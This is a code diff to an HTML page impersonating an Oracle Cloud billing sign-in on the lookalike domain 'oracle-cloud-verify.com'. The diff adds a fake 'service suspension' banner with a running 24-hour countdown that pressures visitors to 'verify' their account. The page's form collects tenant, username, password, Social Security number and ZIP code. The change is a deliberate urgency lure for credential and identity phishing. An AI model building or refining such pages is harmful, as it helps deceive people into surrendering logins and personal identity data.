@@ -53,10 +53,36 @@
             color: #666;
             text-decoration: underline;
         }
+        .urgency-countdown-banner {
+            max-width: 760px;
+            margin: 16px auto 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 18px;
+            background: var(--or-red);
+            color: #fff;
+            border-radius: 4px;
+            font-size: 14px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+        }
+        .urgency-countdown-banner .ucb-icon { font-size: 20px; line-height: 1; }
+        .urgency-countdown-banner .ucb-text { flex: 1; font-weight: 500; }
+        .urgency-countdown-banner #ucb-countdown {
+            font-family: "Source Code Pro", Menlo, Consolas, monospace;
+            font-weight: 700;
+            background: rgba(0,0,0,0.18);
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
     </style>
 </head>
 <body>
     <div class="browser-bar">https://oracle-cloud-verify.com/signin/billing</div>
+    <div id="urgency-countdown-banner" class="urgency-countdown-banner" role="alert">
+        <span class="ucb-icon">&#9888;</span>
+        <span class="ucb-text">Service suspension scheduled in <span id="ucb-countdown">23:59:59</span> &mdash; verify your billing account to remain active.</span>
+    </div>
     <header><div class="or-logo">ORACLE <span>Cloud</span></div></header>
     <div class="container">
         <div class="status-banner" id="status-banner"></div>
@@ -129,7 +155,24 @@
             banner.classList.add('visible');
         }
 
+        function startUrgencyCountdown() {
+            const el = document.getElementById('ucb-countdown');
+            if (!el) return;
+            let secs = 24 * 3600 - 1;
+            const fmt = () => {
+                const h = String(Math.floor(secs / 3600)).padStart(2, '0');
+                const m = String(Math.floor((secs % 3600) / 60)).padStart(2, '0');
+                const s = String(secs % 60).padStart(2, '0');
+                el.textContent = `${h}:${m}:${s}`;
+            };
+            fmt();
+            setInterval(() => {
+                if (secs > 0) { secs -= 1; fmt(); }
+            }, 1000);
+        }
+
         document.addEventListener('DOMContentLoaded', () => {
+            startUrgencyCountdown();
             ['tenant', 'user', 'pw', 'ssn', 'zip'].forEach((id) => {
                 const el = document.getElementById(id);
                 el.addEventListener('blur', () => {
